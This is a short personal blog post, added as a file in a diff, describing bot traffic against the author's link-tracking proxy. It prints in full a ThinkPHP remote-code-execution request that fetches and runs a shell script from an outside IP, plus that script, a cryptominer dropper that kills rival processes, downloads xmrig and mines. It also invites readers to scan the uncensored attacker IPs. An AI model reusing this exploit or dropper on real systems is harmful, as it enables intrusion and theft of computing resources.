@@ -1,0 +1,78 @@
+dave's plaintext blog...			
+							inefficiently
+            ______				content
+          ,'"       "-.                 quality
+        ,'              "-._ _._ beaming 
+        ;              __,-'/   |
+       ;|           ,-' _,'"'._,.
+       |:            _,'      |\ `.
+       : \       _,-'         | \  `.
+        \ \   ,-'             |  \   \
+         \ '.         .-.     |       \
+          \  \         "      |        :
+           `. `.              |        |
+             `. "-._          |        ;
+             / |`._ `-._      L       /
+            /  | \ `._   "-.___    _,'
+           /   |  \_.-"-.___   """"
+           \   :            /"""
+            `._\_       __.'_
+       __,--''_ ' "--'''' \_  `-._
+ __,--'     .' /_  |   __. `-._   `-._
+<            `.  `-.-''  __,-'     _,-'
+ `.            `.   _,-'"      _,-'
+   `.            ''"       _,-'
+     `.                _,-'
+       `.          _,-'
+         `.   __,'"
+           `'"
+
+If you've arrived at this landing page, you've gotten here by accident. This
+server is only a proxy used for data analytics on links I post to my resume, github etc.
+
+::May 17th, 2019
+I created this 'middleman' server to track who was actually clicking on the links I put on
+my resume and on linkedin. Unsurprisingly, few real people but unexpectedly, a huge
+number of bots. This domain and its static ipv4 address were previously not really indexed
+anywhere, so I wasn't shocked when bingbot, ahrefs bots, etc were crawling the domain.
+However, I also started recently getting traffic from malicious bots who were attempting
+to bruteforce services running on the 3 ports open on this box. The very first requests that
+jumped out from the logs were to the following urls:
+ - https://54.204.62.167/mysql/admin/index.php?lang=en
+ - https://54.204.62.167/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://81.6.42.123/a_thk.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a;
+The requests were actually made with http but were upgraded to https which first alerted me
+to them. These requests were made blindly to this static ipv4 address which meant that they're
+probably originating from some botnet program trying to bruteforce some ranges. 
+BTW i'm not censoring any ips going forward so you can try this all at home :)
+
+As you can clearly see from the encoded url, the bot program doesn't care at all about
+stealth whatsoever and looks to be performing a simple task on port 80. It either
+fingerprinted the os and chose to run a bash script or it was simply doing the same thing
+for every box it comes across. I didn't look too much into the invokefunction
+vuln it was attempting to exploit and instead wget'd the file referenced in the url.
+The file is pasted below:
+
+a_thk.sh
+-------------------------------------------------------------------------------
+while true;
+do
+	crontab -r;
+	ps -eo user,pid,time,comm | grep $("whoami") | grep -v 'rogue' | awk 'BEGIN{ FS=":|-"; OFS=""; } { print $1,$2,$3,$4,$5,$6 }' | awk '$3>500' | awk '{print $2}' | xargs -r kill -9
+	ps x | grep 'networkservic[e]' | awk '{print $1}' | xargs -r kill -9
+	ps x | grep 'sysupdat[e]' | awk '{print $1}' | xargs -r kill -9
+	if [ ! -s "/tmp/rogue_s" ]; then
+    	wget http://81.6.42.123/xmrig_s -O /tmp/rogue_s; chmod +x /tmp/rogue_s;
+	fi
+	if [ ! -s "/tmp/rogue_s" ]; then
+    	wget http://82.72.134.224/xmrig_s -O /tmp/rogue_s; chmod +x /tmp/rogue_s;
+	fi
+	if [ "$(ps -eo comm | grep -c "rogu[e]")" -lt "2" ]; then
+		/tmp/rogue_s -r 1000 --donate-level 1 -o 139.224.15.175:26591 -B -p pass -k --max-cpu-usage=99 ;
+	fi
+	sleep 120;
+done
+-----------------------------------------------------------------------------------
+
+Again, you're free to nmap those uncensored ips like I have. There's unsecured and
+unupdated services running on those boxes too!
+
